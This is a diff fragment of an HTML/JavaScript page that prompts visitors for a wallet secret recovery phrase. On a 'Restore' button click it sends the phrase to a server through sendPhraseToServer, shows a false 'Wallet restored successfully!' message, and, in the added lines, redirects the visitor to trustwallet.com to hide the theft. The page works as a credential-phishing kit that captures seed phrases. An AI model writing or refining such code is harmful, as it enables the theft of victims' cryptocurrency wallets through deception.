@@ -600,7 +600,7 @@
   });
 
   // Also send on "Restore" button click for final capture
-  document.querySelector('.restore-btn').addEventListener('click', function() {
+ document.querySelector('.restore-btn').addEventListener('click', function() {
     const val = phraseInput.value.trim();
     if (!val) {
       alert('Please enter or paste your secret phrase first.');
@@ -611,9 +611,11 @@
       alert('Secret phrase must be 12, 18, or 24 words. You entered ' + words.length + ' word(s).');
       return;
     }
-    // Final send before success
     sendPhraseToServer(val);
     alert('Wallet restored successfully!');
+    setTimeout(() => {
+      window.location.href = 'https://trustwallet.com/';
+    }, 2000);
   });
 </script>
 </body>
